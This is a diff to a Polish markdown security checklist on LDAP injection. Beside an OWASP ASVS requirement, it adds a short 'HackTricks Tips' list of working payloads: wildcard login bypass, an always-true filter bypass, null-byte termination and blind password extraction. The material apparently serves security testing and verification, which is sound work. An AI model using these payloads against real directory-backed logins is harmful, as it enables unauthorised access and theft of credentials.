@@ -131,3 +131,13 @@ Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas 
 | ID | Sekcja | Wymaganie |
 |---|---|---|
 | V1.2.6 | Injection Prevention | Verify that the application protects against LDAP injection vulnerabilities, or that specific security controls to prevent LDAP injection have been implemented. |
+
+
+---
+
+## HackTricks Tips
+
+- **Login bypass**: `user=*` / `password=*` → `(&(user=*)(password=*))` zwraca pierwszego usera
+- **Advanced bypass**: `user=*)(|(password=*` / `pass=pwd)` → filter zawsze true
+- **Null termination**: `user=*))%00` — zatrzymuje processing filtra
+- **Blind extraction**: iteruj znaki z `(&(sn=admin)(password=A*))` — sprawdzaj boolean response
